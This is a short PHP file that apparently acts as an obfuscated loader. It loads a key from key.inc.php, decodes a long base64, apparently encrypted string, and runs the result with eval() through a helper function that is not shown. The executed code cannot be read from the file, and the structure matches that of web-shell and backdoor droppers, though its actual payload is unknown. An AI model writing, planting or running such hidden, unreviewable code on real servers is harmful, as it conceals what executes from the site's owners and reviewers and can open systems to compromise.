<?php
if (!function_exists('openssl_decrypt')) {
    die('<h2>Function openssl_decrypt() not found !</h2>');
}
if (!defined('_FILE_')) {
    define("_FILE_", getcwd() . DIRECTORY_SEPARATOR . basename($_SERVER['PHP_SELF']), false);
}
if (!defined('_DIR_')) {
    define("_DIR_", getcwd(), false);
}
if (file_exists('key.inc.php')) {
    include_once('key.inc.php');
} else {
    die('<h2>File key.inc.php not found !</h2>');
}
$e7091 = "U01tQXJYb1hiN0dSM21ZZWRLRXdMSThZV2I2TytxbnF5bTRSMUZ6dEd0LzVUWGN2bFRkOTJpRUdHYldvZU1xd0tLNlZ0U0Z1WmNhVFducytEbmNBc0NCRkZlYnAyZUw2VEwvM1RmRDlsUGt4ZGJlNDYrRVZKNHNtWmUxb1ppUjNLS3Y1cm16cmh2bkcxVWFUQ3NwZ1d6WEluNVpRQUt4TEZsbnBkUFhJQ0lBQVRRK25xclB6bmtoOGRGUVp5dnROZmdZY2JHb1cyMk5FWElQNkZLcUdnU2M1RE5VTUs4MkdQOEFPUmdvQ09qTE5IWUsxVnZ1KytGUExlM3JHSTNhWjl0TVlnZ3M4OWNNK2thUnVuNisvT0Vwc0tlMGJCQ1Rlclp2alA2MVlCRDRYTXI4emJTdFIyVmFuSTlqekJCUG5tOUlZcXp0MWtmODQ1NWYwSEpZdWpxYlFsNlVCd2dtZlBhTWJmZ1drM2sxY0Vnejc2N2tuUUwvYnFXbHdubnZBOHZJV3o5SjlCYzYxSkZObGZ1VFRDR28yalNXNEQybFc2VVJZNFEzSUZqOVpXVnc0UUxNV3ZSQXFEaUNPcGxDeW9scWhNdzkwV3UzQ2IrMFd1N1JhdjJRQW9raGNBTWtLS25PNkZ4UW1yVnNGQTBkZTdzZmM5d3VMekVxRi9sMXlLZkVFbFhkbXZEVEFLajdwWm9DbTJlaWFoRVlQaUxHMDRjOFFVc25Ma1Yzek5meFVHVGlDdFN1QUdpdkt5bDNj";
eval(e7061($e7091));
